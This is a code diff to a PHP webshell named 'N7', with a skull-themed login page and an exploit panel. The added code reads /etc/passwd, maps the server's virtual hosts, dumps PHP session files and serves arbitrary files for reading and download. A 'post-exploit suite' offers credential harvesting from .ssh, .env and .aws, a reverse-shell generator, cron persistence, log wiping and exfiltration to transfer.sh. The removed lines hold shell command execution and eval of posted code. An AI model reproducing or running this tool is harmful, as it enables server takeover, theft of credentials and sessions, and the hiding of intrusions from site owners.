+    $paths = ['/etc/apache2/sites-enabled','/etc/apache2/sites-available','/etc/httpd/conf.d','/etc/nginx/sites-enabled','/etc/nginx/sites-available','/etc/nginx/conf.d'];
+    foreach ($paths as $p) {
+        if (!is_dir($p)) continue;
+        $files = @scandir($p) ?: [];
+        $log .= "--- $p ---\n";
+        foreach ($files as $f) {
+            if ($f === '.' || $f === '..') continue;
+            $full = $p . '/' . $f;
+            if (!@is_file($full)) continue;
+            $c = @file_get_contents($full);
+            if ($c === false) continue;
+            if (preg_match_all('/(?:server_name|ServerName|ServerAlias)\s+([^\s;]+)/i', $c, $m)) {
+                $log .= "  $f: " . implode(', ', array_slice($m[1], 0, 5)) . "\n";
+            }
+            if (preg_match('/(?:root|DocumentRoot)\s+([^\s;]+)/i', $c, $m)) {
+                $log .= "    → " . $m[1] . "\n";
+            }
+        }
+    }
+    $log .= "\n=== /etc/passwd users ===\n";
+    $pw = @file_get_contents('/etc/passwd');
+    if ($pw) {
+        foreach (explode("\n", $pw) as $l) {
+            if (strpos($l, '/home') !== false || strpos($l, '/root') !== false) $log .= "  $l\n";
+        }
+    }
+    return $log;
+}
+
+function n7_session_dump() {
+    $log = "=== PHP SESSION DUMP ===\n" . str_repeat('=', 60) . "\n";
+    $paths = [session_save_path() ?: '/tmp', '/var/lib/php/sessions', '/var/lib/php5', '/tmp'];
+    $paths = array_unique($paths);
+    foreach ($paths as $p) {
+        if (!is_dir($p)) continue;
+        $files = @glob($p . '/sess_*') ?: [];
+        $log .= "--- $p (" . count($files) . " files) ---\n";
+        $cnt = 0;
+        foreach ($files as $f) {
+            $c = @file_get_contents($f, false, null, 0, 500);
+            if ($c === false) continue;
+            $log .= basename($f) . ": " . substr(str_replace("\n", ' ', $c), 0, 100) . "\n";
+            if (++$cnt >= 20) { $log .= "...\n"; break; }
+        }
+    }
+    return $log;
+}
 
 function n7_gs_arch() {
     $u = php_uname('m');
@@ -997,75 +1081,231 @@ function n7_full_scan($t) {
     return $o;
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
-    if (!n7_csrf_ok()) { $msg = '⚠ CSRF invalid'; $msg_type = 'err'; }
-    else {
-        $act = $_POST['act'];
-        try {
-            switch ($act) {
-                case 'chmod':
-                    $f = $_POST['file'] ?? ''; $m = $_POST['mode'] ?? '';
-                    if ($f && preg_match('/^[0-7]{3,4}$/', $m) && file_exists($f)) {
-                        @chmod($f, octdec($m)); $msg = "✔ CHMOD $m OK"; $action_done = 'chmod';
-                    } else { $msg = '✘ chmod failed'; $msg_type = 'err'; }
-                    break;
-                case 'rename':
-                    $o = $_POST['old'] ?? ''; $n = $_POST['new'] ?? '';
-                    if ($o && $n && @rename($o, $n)) { $msg = "✔ Renamed"; $action_done = 'rename'; }
-                    else { $msg = '✘ rename failed'; $msg_type = 'err'; }
-                    break;
-                case 'delete':
-                    $f = $_POST['file'] ?? '';
-                    if (is_dir($f)) { if (@rmdir($f)) { $msg = "✔ Dir deleted"; $action_done = 'del'; } else { $msg = '✘ dir not empty'; $msg_type = 'err'; } }
-                    elseif (is_file($f)) { if (@unlink($f)) { $msg = "✔ File deleted"; $action_done = 'del'; } else { $msg = '✘ fail'; $msg_type = 'err'; } }
-                    else { $msg = '✘ not found'; $msg_type = 'err'; }
-                    break;
-                case 'mkdir':
-                    $n = $_POST['name'] ?? ''; if ($n && @mkdir($cwd . DIRECTORY_SEPARATOR . $n, 0755)) { $msg = "✔ Created $n"; $action_done = 'mkdir'; }
-                    else { $msg = '✘ mkdir failed'; $msg_type = 'err'; }
-                    break;
-                case 'create':
-                    $n = $_POST['name'] ?? ''; $c = $_POST['content'] ?? '';
-                    if ($n && @file_put_contents($cwd . DIRECTORY_SEPARATOR . $n, $c) !== false) { $msg = "✔ Created $n"; $action_done = 'create'; }
-                    else { $msg = '✘ create failed'; $msg_type = 'err'; }
-                    break;
-                case 'save':
-                    $f = $_POST['file'] ?? ''; $c = $_POST['content'] ?? '';
-                    if ($f && @file_put_contents($f, $c) !== false) { $msg = "✔ Saved"; $action_done = 'save'; }
-                    else { $msg = '✘ save failed'; $msg_type = 'err'; }
-                    break;
-                case 'upload':
-                    if (!empty($_FILES['upfile']['name'])) {
-                        $t = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upfile']['name']);
-                        if (@move_uploaded_file($_FILES['upfile']['tmp_name'], $t)) { $msg = "✔ Uploaded"; $action_done = 'upload'; }
-                        else { $msg = '✘ upload failed'; $msg_type = 'err'; }
-                    } else { $msg = '✘ no file'; $msg_type = 'err'; }
-                    break;
-                case 'cmd':
-                    $c = $_POST['cmd'] ?? '';
-                    if ($c !== '') {
-                        $out = '';
-                        if (function_exists('shell_exec')) $out = @shell_exec($c . ' 2>&1');
-                        elseif (function_exists('exec')) { @exec($c . ' 2>&1', $o); $out = implode("\n", (array)$o); }
-                        elseif (function_exists('system')) { ob_start(); @system($c . ' 2>&1'); $out = ob_get_clean(); }
-                        elseif (function_exists('passthru')) { ob_start(); @passthru($c . ' 2>&1'); $out = ob_get_clean(); }
-                        $msg = "CMD: $c\n" . str_repeat('─', 50) . "\n" . (trim((string)$out) === '' ? '(no output / disabled)' : $out);
-                        $msg_type = 'term';
-                    }
-                    break;
-                case 'php':
-                    $code = $_POST['code'] ?? '';
-                    if ($code !== '') {
-                        ob_start();
-                        try { eval($code); } catch (Throwable $e) { echo 'ERROR: ' . $e->getMessage(); }
-                        $msg = "PHP OUTPUT:\n" . str_repeat('─', 50) . "\n" . ob_get_clean();
-                        $msg_type = 'term';
-                    }
-                    break;
-            }
-        } catch (Throwable $e) { $msg = 'EXC: ' . $e->getMessage(); $msg_type = 'err'; }
+function n7_shell_scan($root = null) {
+    if ($root === null || !is_dir($root)) {
+        $root = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
+        if (!is_dir($root)) $root = getcwd();
     }
+    $root = rtrim(realpath($root) ?: $root, DIRECTORY_SEPARATOR);
+    $log = "=== WEBSHELL SCANNER ===\n" . str_repeat('=', 60) . "\n";
+    $log .= "SCAN ROOT: $root\n";
+    $log .= "TIME: " . date('Y-m-d H:i:s') . "\n\n";
+    $patterns = [
+        'eval_post'         => '/eval\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'eval_var'          => '/eval\s*\(\s*\$[a-zA-Z_]/i',
+        'base64_decode'     => '/base64_decode\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'gzinflate'         => '/gzinflate\s*\(\s*base64_decode/i',
+        'gzuncompress'      => '/gzuncompress\s*\(\s*base64_decode/i',
+        'str_rot13_eval'    => '/eval\s*\(\s*str_rot13/i',
+        'assert_post'       => '/assert\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'system_var'        => '/system\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'exec_var'          => '/exec\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'shell_exec_var'    => '/shell_exec\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'passthru_var'      => '/passthru\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'popen_var'         => '/popen\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'proc_open_var'     => '/proc_open\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'preg_e'            => '/preg_replace\s*\(\s*[\'"].*\/e[\'"]/i',
+        'create_function'   => '/create_function\s*\(\s*[\'"].*eval/i',
+        'file_put_contents' => '/file_put_contents\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'fwrite_post'       => '/fwrite\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'move_uploaded'     => '/move_uploaded_file\s*\(\s*\$_(FILES|POST)/i',
+        'php_uname_system'  => '/php_uname\s*\(\s*\)\s*[;.]/i',
+        'cmd_param'         => '/\$_GET\s*\[\s*[\'"](?:cmd|exec|command|shell|q|act)[\'"]\s*\]/i',
+        'eval_request_var'  => '/eval\s*\(\s*(?:@)?\$_(?:POST|REQUEST|GET|COOKIE)\s*\[/i',
+        'assert_eval'       => '/@?assert\s*\(\s*(?:@)?\$_(?:POST|REQUEST|GET|COOKIE)/i',
+        'chr_obfusc'        => '/(?:chr\s*\(\s*\d+\s*\)\s*\.\s*){5,}/i',
+        'var_dump_post'     => '/var_dump\s*\(\s*\$_(POST|REQUEST|GET)/i',
+        'md5_post'          => '/md5\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'shell_get'         => '/\$_GET\s*\[\s*[\'"](?:c|cmd|exec|command)[\'"]\s*\]\s*(?:;|\)|\])/i',
+        'eval_string'       => '/eval\s*\(\s*[\'"][^\'"]{20,}/i',
+        'system_get'        => '/system\s*\(\s*\$_GET/i',
+        'include_get'       => '/(?:include|require)(?:_once)?\s*\(\s*\$_GET/i',
+        'include_post'      => '/(?:include|require)(?:_once)?\s*\(\s*\$_POST/i',
+    ];
+    $suspicious_names = ['shell','cmd','backdoor','wso','b374k','c99','r57','webshell','uploader','pwn','hack','ghost','mini','alfa','indoxploit','marijuana','priv8','anonym','cyber','dark','black','null7','xploit','defacer','mass','symlink','ajax','gate','drop'];
+    $results = [];
+    $stats = ['scanned' => 0, 'detected' => 0, 'suspicious' => 0, 'errors' => 0];
+    $skip_dirs = ['node_modules', 'vendor', '.git', '.svn', '.cache', 'cache', 'tmp', 'temp'];
+    try {
+        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+        foreach ($it as $f) {
+            if ($f->getExtension() !== 'php') continue;
+            $path = $f->getPathname();
+            $basename = strtolower($f->getBasename());
+            $skip = false;
+            foreach ($skip_dirs as $sd) if (strpos($path, DIRECTORY_SEPARATOR . $sd . DIRECTORY_SEPARATOR) !== false) { $skip = true; break; }
+            if ($skip) continue;
+            $stats['scanned']++;
+            if ($f->getSize() > 5 * 1024 * 1024) continue;
+            $content = @file_get_contents($path, false, null, 0, 200 * 1024);
+            if ($content === false) { $stats['errors']++; continue; }
+            $matches = [];
+            foreach ($patterns as $pname => $pre) if (@preg_match($pre, $content)) $matches[] = $pname;
+            $score = count($matches);
+            $name_flag = false;
+            foreach ($suspicious_names as $sn) if (strpos($basename, $sn) !== false) { $name_flag = true; break; }
+            if ($name_flag) $score += 3;
+            $entropy_flag = false;
+            if (strlen($content) > 500) {
+                $sample = substr($content, 0, 3000);
+                $b64chars = preg_match_all('/[A-Za-z0-9+\/]{100,}/', $sample);
+                if ($b64chars >= 2) { $entropy_flag = true; $score += 2; }
+            }
+            if ($score >= 2) {
+                $stats['detected']++;
+                $results[] = ['path' => $path, 'size' => $f->getSize(), 'score' => $score, 'matches' => $matches, 'name_flag' => $name_flag, 'entropy' => $entropy_flag];
+            } elseif ($score === 1) {
+                $stats['suspicious']++;
+                $results[] = ['path' => $path, 'size' => $f->getSize(), 'score' => $score, 'matches' => $matches, 'name_flag' => $name_flag, 'entropy' => $entropy_flag];
+            }
+        }
+    } catch (Throwable $ex) { $log .= "EXCEPTION: " . $ex->getMessage() . "\n"; }
+    usort($results, fn($a, $b) => $b['score'] <=> $a['score']);
+    $log .= "=== STATISTICS ===\n";
+    $log .= "Scanned PHP files : " . $stats['scanned'] . "\n";
+    $log .= "Detected (score>=2): " . $stats['detected'] . "\n";
+    $log .= "Suspicious (score=1): " . $stats['suspicious'] . "\n";
+    $log .= "Read errors       : " . $stats['errors'] . "\n\n";
+    if (empty($results)) return $log . "✔ No webshell detected. Clean!\n";
+    $log .= "=== DETECTED FILES ===\n\n";
+    foreach ($results as $idx => $r) {
+        $tag = $r['score'] >= 2 ? '⚠ DETECTED' : '? SUSPICIOUS';
+        $log .= sprintf("[%d] %s (score=%d)\n", $idx + 1, $tag, $r['score']);
+        $log .= "    Path: " . $r['path'] . "\n";
+        $log .= "    Size: " . n7_size($r['size']) . "\n";
+        if ($r['name_flag']) $log .= "    ⚑ Suspicious filename\n";
+        if ($r['entropy']) $log .= "    ⚑ High base64 obfuscation\n";
+        if (!empty($r['matches'])) $log .= "    Signals: " . implode(', ', array_slice($r['matches'], 0, 10)) . "\n";
+        $log .= "\n";
+    }
+    $log .= "TOTAL FINDINGS: " . count($results) . "\n";
+    return $log;
 }
+
+$logged = !empty($_SESSION['n7_auth']) && $_SESSION['n7_auth'] === N7_HASH;
+if (!$logged && isset($_POST['login_user'], $_POST['login_pass'])) {
+    if (hash_equals(N7_USER, (string)$_POST['login_user']) && hash_equals(N7_PASS, (string)$_POST['login_pass'])) {
+        $_SESSION['n7_auth'] = N7_HASH;
+        header('Location: ?'); exit;
+    } else { $login_err = 'ACCESS DENIED'; }
+}
+if (isset($_GET['logout'])) { $_SESSION = []; session_destroy(); header('Location: ?'); exit; }
+
+if (!$logged) {
+    $login_failed = !empty($login_err);
+    $bg = N7_BG_GIF;
+?><!DOCTYPE html><html lang="id"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title><?=N7_NAME?></title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{background:#050005;min-height:100vh;display:flex;align-items:center;justify-content:center;
+  font-family:'Courier New',monospace;color:#e0d0e8;padding:16px;
+  background-image:linear-gradient(rgba(20,0,25,.35), rgba(10,0,20,.5)),url('<?=$bg?>');
+  background-size:cover;background-position:center center;background-attachment:fixed;background-repeat:no-repeat}
+body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
+  background:radial-gradient(circle at 15% 0%, rgba(120,0,80,.3) 0%, transparent 50%),
+    radial-gradient(circle at 85% 100%, rgba(0,80,100,.25) 0%, transparent 50%),
+    radial-gradient(ellipse at center, transparent 45%, rgba(0,0,0,.75) 100%);mix-blend-mode:multiply}
+body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
+  background:repeating-linear-gradient(0deg,transparent 0 3px,rgba(255,0,60,.02) 3px 4px);
+  animation:scanline 8s linear infinite}
+@keyframes scanline{0%{background-position:0 0}100%{background-position:0 100%}}
+.lb{position:relative;z-index:2;background:linear-gradient(135deg, rgba(40,0,50,.72), rgba(15,0,25,.82));
+  backdrop-filter:blur(16px) saturate(1.3);-webkit-backdrop-filter:blur(16px) saturate(1.3);
+  border:2px solid rgba(180,0,80,.7);border-radius:14px;padding:30px 24px;width:100%;max-width:400px;
+  box-shadow:0 0 60px rgba(255,0,60,.4),0 0 100px rgba(150,0,180,.25),inset 0 0 40px rgba(180,0,80,.15)}
+.skull{font-size:80px;text-align:center;color:#ff2a5f;text-shadow:0 0 20px #ff0040,0 0 50px #aa0050,0 0 3px #000;
+  animation:pulse 2.2s infinite;margin-bottom:6px}
+@keyframes pulse{0%,100%{opacity:.88;transform:scale(1)}50%{opacity:1;transform:scale(1.07)}}
+h1{text-align:center;color:#ff4477;letter-spacing:4px;font-size:20px;text-shadow:0 0 14px #ff0040,0 0 4px #000;margin-bottom:16px}
+label{display:block;color:#d080a0;font-size:11px;margin:12px 0 5px;letter-spacing:1px;text-shadow:0 0 3px #000}
+input{width:100%;padding:12px 14px;background:rgba(30,0,40,.85);border:1px solid #a00060;border-radius:6px;
+  color:#ffb0d0;font-family:inherit;font-size:14px;outline:none;transition:.2s;backdrop-filter:blur(4px)}
+input:focus{border-color:#ff2a5f;box-shadow:0 0 18px rgba(255,0,60,.6);background:rgba(45,0,55,.9)}
+button{width:100%;margin-top:20px;padding:14px;background:linear-gradient(180deg,#a0003a,#500020);
+  border:1px solid #ff2a5f;border-radius:6px;color:#ffffff;font-family:inherit;font-size:13px;
+  font-weight:bold;letter-spacing:4px;cursor:pointer;text-shadow:0 0 8px #ff0040,0 0 3px #000;transition:.2s;
+  box-shadow:0 0 20px rgba(180,0,80,.4)}
+button:hover{background:linear-gradient(180deg,#d0004a,#800030);box-shadow:0 0 30px rgba(255,0,60,.75)}
+.err{background:rgba(160,0,50,.4);border:1px solid #ff2a5f;color:#ff7080;padding:9px;
+  border-radius:6px;font-size:11px;text-align:center;margin-bottom:10px;letter-spacing:1px}
+.foot{text-align:center;color:#996080;font-size:10px;margin-top:14px;letter-spacing:1px;text-shadow:0 0 3px #000}
+@media(max-width:400px){.skull{font-size:65px}h1{font-size:17px}.lb{padding:24px 16px}}
+</style></head><body>
+<div class="lb">
+  <div class="skull">☠</div>
+  <h1><?=N7_NAME?></h1>
+  <?php if (!empty($login_err)): ?><div class="err"><?=h($login_err)?></div><?php endif; ?>
+  <form method="post" autocomplete="off" id="loginForm">
+    <label>USERNAME</label><input type="text" name="login_user" required autofocus>
+    <label>PASSWORD</label><input type="password" name="login_pass" required>
+    <button type="submit">ENTER</button>
+  </form>
+  <div class="foot">BY <?=N7_AUTHOR?> // v<?=N7_VERSION?></div>
+</div>
+<script>
+var ac = null;
+function getAC(){ if(!ac){ try{ ac = new (window.AudioContext||window.webkitAudioContext)(); }catch(e){} } return ac; }
+function beep(f, d, type){ var c = getAC(); if(!c) return;
+  var o = c.createOscillator(), g = c.createGain();
+  o.type = type || 'square'; o.frequency.value = f || 700;
+  g.gain.setValueAtTime(0.06, c.currentTime);
+  g.gain.exponentialRampToValueAtTime(0.001, c.currentTime+(d||0.1));
+  o.connect(g); g.connect(c.destination); o.start(); o.stop(c.currentTime+(d||0.1)); }
+function accessDenied(){
+  beep(400, 0.15, 'sawtooth');
+  setTimeout(function(){ beep(300, 0.15, 'sawtooth'); }, 120);
+  setTimeout(function(){ beep(200, 0.25, 'sawtooth'); }, 240);
+  setTimeout(function(){ beep(150, 0.4, 'sawtooth'); }, 420);
+}
+<?php if ($login_failed): ?>accessDenied();<?php endif; ?>
+document.getElementById('loginForm').addEventListener('submit', function(e){
+  try { localStorage.setItem('n7_login_success', '1'); } catch(e2) {}
+});
+</script>
+</body></html>
+<?php
+    exit;
+}
+
+if (isset($_GET['action']) && $_GET['action'] === 'readfile' && !empty($_GET['f'])) {
+    header('Content-Type: application/json');
+    try {
+        $f = $_GET['f'];
+        $real = @realpath($f);
+        if ($real === false || !is_file($real)) { echo json_encode(['ok' => false, 'error' => 'File not found']); exit; }
+        if (!is_readable($real)) { echo json_encode(['ok' => false, 'error' => 'File not readable']); exit; }
+        $content = @file_get_contents($real);
+        if ($content === false) { echo json_encode(['ok' => false, 'error' => 'Read failed']); exit; }
+        if (strlen($content) > 2 * 1024 * 1024) { echo json_encode(['ok' => false, 'error' => 'File too large (>2MB)']); exit; }
+        echo json_encode(['ok' => true, 'content' => $content]);
+    } catch (Throwable $ex) { echo json_encode(['ok' => false, 'error' => $ex->getMessage()]); }
+    exit;
+}
+
+if (isset($_GET['action']) && $_GET['action'] === 'download' && !empty($_GET['f'])) {
+    $f = $_GET['f'];
+    if (@is_file($f) && @is_readable($f)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
+        header('Content-Length: ' . filesize($f));
+        @readfile($f);
+        exit;
+    }
+    http_response_code(404); echo "Not found"; exit;
+}
+
+$page = $_GET['p'] ?? 'home';
+if ($page === 'cms') $page = 'exploit';
+if (!in_array($page, ['home', 'exploit', 'gsocket', 'tools'])) $page = 'home';
+
+$msg = ''; $msg_type = 'ok'; $action_done = '';
+$cwd = n7_cwd();
+$self_host = n7_self_host();
+$self_base = n7_self_base();
+$srv = n7_server_info();
+$csrf = $_SESSION['n7_csrf'];
 
 $gs_result = '';
 if ($page === 'gsocket' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['gs_act'])) {
@@ -1219,6 +1459,40 @@ if ($page === 'exploit' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST
                 }
             } catch (Throwable $ex) { $exploit_result = "EXC: " . $ex->getMessage(); }
         }
+    }
+}
+
+$post_result = '';
+if ($page === 'exploit' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['post_act'])) {
+    if (!n7_csrf_ok()) { $post_result = '⚠ CSRF invalid'; }
+    else {
+        $pa = $_POST['post_act'];
+        $p_root = trim($_POST['post_root'] ?? '') ?: null;
+        $p_arg1 = trim($_POST['post_arg1'] ?? '');
+        $p_arg2 = trim($_POST['post_arg2'] ?? '');
+        try {
+            switch ($pa) {
+                case 'ssh_harvest':    $post_result = n7_ssh_harvest($p_root); break;
+                case 'db_browser_list':$post_result = n7_db_browser('list'); break;
+                case 'db_browser_tables': $post_result = n7_db_browser('tables', $p_arg1); break;
+                case 'db_browser_query': $post_result = n7_db_browser('query', '', $p_arg1); break;
+                case 'privesc':        $post_result = n7_privesc_check(); break;
+                case 'port_scan':      $post_result = n7_port_scan(); break;
+                case 'revshell_gen':   $post_result = n7_revshell_gen($p_arg1, $p_arg2 ?: '4444', 'bash'); break;
+                case 'backup_full':    $post_result = n7_backup_full($p_root); break;
+                case 'cron_list':      $post_result = n7_cron_persist('list'); break;
+                case 'cron_add':       $post_result = n7_cron_persist('add', $p_arg1); break;
+                case 'log_wipe':       $post_result = n7_log_wipe(); break;
+                case 'file_download':  $post_result = n7_file_transfer('download', $p_arg1, $p_arg2); break;
+                case 'file_exfil':     $post_result = n7_file_transfer('exfil', $p_arg1); break;
+                case 'proc_list':      $post_result = n7_process_mgr('list'); break;
+                case 'proc_kill':      $post_result = n7_process_mgr('kill', (int)$p_arg1); break;
+                case 'geoip':          $post_result = n7_geoip($p_arg1 ?: null); break;
+                case 'multi_site':     $post_result = n7_multi_site(); break;
+                case 'session_dump':   $post_result = n7_session_dump(); break;
+                default:               $post_result = "Unknown post-exploit action.\n";
+            }
+        } catch (Throwable $ex) { $post_result = "EXC: " . $ex->getMessage(); }
     }
 }
 
@@ -1422,6 +1696,7 @@ header .spacer{flex:1;min-width:8px}
 .msg.term{background:#000;border-color:#00c060;color:#33ff88}
 .msg.term-cyan{background:#000;border-color:#00cccc;color:#33ffff}
 .msg.term-orange{background:#000;border-color:#ffaa00;color:#ffcc66}
+.msg.term-purple{background:#000;border-color:#cc66ff;color:#e0aaff}
 .grid{display:grid;grid-template-columns:1fr;gap:12px}
 @media(min-width:900px){.grid{grid-template-columns:1fr 1fr}}
 .card{border:1px solid rgba(160,0,80,.65);border-radius:9px;
@@ -1431,12 +1706,14 @@ header .spacer{flex:1;min-width:8px}
 .card.green{border-color:rgba(0,160,100,.65);background:linear-gradient(135deg, rgba(0,35,20,.85), rgba(0,15,10,.88))}
 .card.cyan{border-color:rgba(0,140,160,.65);background:linear-gradient(135deg, rgba(0,25,40,.85), rgba(0,12,20,.88))}
 .card.orange{border-color:rgba(160,110,0,.65);background:linear-gradient(135deg, rgba(35,25,0,.85), rgba(15,12,0,.88))}
+.card.purple{border-color:rgba(140,60,180,.7);background:linear-gradient(135deg, rgba(35,0,50,.88), rgba(20,0,30,.9))}
 .card h2{padding:8px 13px;background:linear-gradient(180deg,rgba(60,0,40,.95),rgba(25,0,20,.95));
   color:#ff5588;font-size:11px;letter-spacing:2px;border-bottom:1px solid rgba(160,0,80,.6);
   text-shadow:0 0 8px #ff0040,0 0 3px #000;display:flex;align-items:center;gap:7px}
 .card.green h2{background:linear-gradient(180deg,rgba(0,60,35,.95),rgba(0,25,15,.95));color:#66ff99}
 .card.cyan h2{background:linear-gradient(180deg,rgba(0,55,70,.95),rgba(0,20,30,.95));color:#66ddff}
 .card.orange h2{background:linear-gradient(180deg,rgba(60,40,0,.95),rgba(25,18,0,.95));color:#ffcc66}
+.card.purple h2{background:linear-gradient(180deg,rgba(60,0,80,.95),rgba(30,0,45,.95));color:#d080ff}
 .card .body{padding:12px}
 .file-table-wrap{overflow:auto;max-height:540px;border-radius:5px;background:rgba(0,0,0,.5)}
 table{width:100%;border-collapse:collapse;font-size:12px}
@@ -1492,10 +1769,14 @@ input[type=file]{padding:7px;background:rgba(35,0,40,.9);border:1px dashed rgba(
 .exp-btn.gs{background:linear-gradient(135deg, rgba(40,0,50,.88), rgba(25,0,30,.9));border-color:#cc00cc;color:#ffddff}
 .exp-btn.gs .icon{color:#ff66ff}
 .exp-btn.gs:hover{background:linear-gradient(135deg, rgba(80,0,90,.92), rgba(45,0,55,.92));border-color:#ff44ff;box-shadow:0 0 16px rgba(255,68,255,.6)}
+.exp-btn.purple{background:linear-gradient(135deg, rgba(55,0,80,.9), rgba(30,0,50,.92));border-color:#a040d0;color:#e8ccff}
+.exp-btn.purple .icon{color:#d080ff;text-shadow:0 0 6px rgba(200,80,255,.5)}
+.exp-btn.purple:hover{background:linear-gradient(135deg, rgba(90,0,130,.94), rgba(50,0,80,.94));border-color:#cc66ff;box-shadow:0 0 16px rgba(200,80,255,.6)}
 .alert{padding:10px 13px;border-radius:7px;margin-bottom:12px;font-size:12px;line-height:1.5;
   backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);text-shadow:0 0 3px #000;box-shadow:0 0 12px rgba(0,0,0,.4)}
 .alert.info{background:linear-gradient(135deg, rgba(0,50,55,.75), rgba(0,25,30,.82));border:1px solid #00b0b0;color:#aaffff}
 .alert.warn{background:linear-gradient(135deg, rgba(55,40,0,.75), rgba(25,18,0,.82));border:1px solid #ffaa00;color:#ffee88}
+.alert.purple{background:linear-gradient(135deg, rgba(55,0,80,.78), rgba(30,0,50,.85));border:1px solid #a040d0;color:#e8ccff}
 .modal{display:none;position:fixed;inset:0;z-index:100;background:rgba(5,0,10,.88);
   backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
   align-items:center;justify-content:center;padding:16px;animation:fadeIn .2s}
@@ -1796,6 +2077,65 @@ footer{position:fixed;bottom:0;left:0;right:0;z-index:3;
     </form>
     <?php if ($exploit_result !== ''): ?><div class="msg term" style="margin-top:12px"><?=h($exploit_result)?></div><?php endif; ?>
     <?php if ($cms_result !== ''): ?><div class="msg term-orange" style="margin-top:12px"><?=h($cms_result)?></div><?php endif; ?>
+  </div>
+</div>
+
+<div class="card purple">
+  <h2>🎯 POST-EXPLOIT SUITE</h2>
+  <div class="body">
+    <form method="post">
+      <input type="hidden" name="csrf" value="<?=$csrf?>">
+      <label>ROOT PATH (kosong = auto)</label>
+      <div class="row"><input type="text" name="post_root" value="<?=h($_POST['post_root'] ?? ($_SERVER['DOCUMENT_ROOT'] ?? ''))?>" placeholder="kosong = auto"></div>
+      <label style="margin-top:10px">ARGUMENTS</label>
+      <div class="row">
+        <input type="text" name="post_arg1" value="<?=h($_POST['post_arg1'] ?? '')?>" placeholder="arg1: DB name / LHOST / URL / file / PID">
+        <input type="text" name="post_arg2" value="<?=h($_POST['post_arg2'] ?? '')?>" placeholder="arg2: LPORT / dest / dll">
+      </div>
+
+      <label style="margin-top:10px">CREDENTIAL HARVESTER</label>
+      <div class="exp-grid">
+        <button class="exp-btn purple" type="submit" name="post_act" value="ssh_harvest"><span class="icon">🔑</span><span>SSH/CRED HARVEST<br><small style="opacity:.6">.ssh .env .aws</small></span></button>
+        <button class="exp-btn purple" type="submit" name="post_act" value="session_dump"><span class="icon">🍪</span><span>SESSION DUMP<br><small style="opacity:.6">/var/lib/php</small></span></button>
+      </div>
+
+      <label style="margin-top:10px">DATABASE</label>
+      <div class="exp-grid">
+        <button class="exp-btn purple" type="submit" name="post_act" value="db_browser_list"><span class="icon">🗄</span><span>DB LIST<br><small style="opacity:.6">databases</small></span></button>
+        <button class="exp-btn purple" type="submit" name="post_act" value="db_browser_tables"><span class="icon">📊</span><span>DB TABLES<br><small style="opacity:.6">arg1=dbname</small></span></button>
+        <button class="exp-btn purple" type="submit" name="post_act" value="db_browser_query"><span class="icon">💻</span><span>DB QUERY<br><small style="opacity:.6">arg1=SQL</small></span></button>
+      </div>
+
+      <label style="margin-top:10px">PRIVESC / SCAN</label>
+      <div class="exp-grid">
+        <button class="exp-btn purple" type="submit" name="post_act" value="privesc"><span class="icon">🚀</span><span>PRIVESC CHECK<br><small style="opacity:.6">sudo SUID cron</small></span></button>
+        <button class="exp-btn purple" type="submit" name="post_act" value="port_scan"><span class="icon">🌐</span><span>LOCAL PORT SCAN<br><small style="opacity:.6">127.0.0.1</small></span></button>
+        <button class="exp-btn purple" type="submit" name="post_act" value="multi_site"><span class="icon">🎯</span><span>MULTI-SITE<br><small style="opacity:.6">apache/nginx</small></span></button>
+      </div>
+
+      <label style="margin-top:10px">REVERSE SHELL</label>
+      <div class="exp-grid">
+        <button class="exp-btn purple" type="submit" name="post_act" value="revshell_gen"><span class="icon">🐚</span><span>REVSHELL GEN<br><small style="opacity:.6">arg1=LHOST arg2=LPORT</small></span></button>
+      </div>
+
+      <label style="margin-top:10px">PERSISTENCE / CLEANUP</label>
+      <div class="exp-grid">
+        <button class="exp-btn purple" type="submit" name="post_act" value="cron_list"><span class="icon">⏰</span><span>CRON LIST<br><small style="opacity:.6">all users</small></span></button>
+        <button class="exp-btn purple" type="submit" name="post_act" value="cron_add"><span class="icon">⏰</span><span>CRON ADD<br><small style="opacity:.6">arg1=command</small></span></button>
+        <button class="exp-btn orange" type="submit" name="post_act" value="log_wipe" onclick="return confirm('Wipe all log files?')"><span class="icon">🧹</span><span>LOG WIPER<br><small style="opacity:.6">clear traces</small></span></button>
+      </div>
+
+      <label style="margin-top:10px">TRANSFER / PROCESS</label>
+      <div class="exp-grid">
+        <button class="exp-btn purple" type="submit" name="post_act" value="backup_full"><span class="icon">📦</span><span>BACKUP FULL<br><small style="opacity:.6">tar.gz site+db</small></span></button>
+        <button class="exp-btn purple" type="submit" name="post_act" value="file_download"><span class="icon">⬇</span><span>DOWNLOAD URL<br><small style="opacity:.6">arg1=url arg2=dest</small></span></button>
+        <button class="exp-btn purple" type="submit" name="post_act" value="file_exfil"><span class="icon">⬆</span><span>EXFIL TO TRANSFER.SH<br><small style="opacity:.6">arg1=filepath</small></span></button>
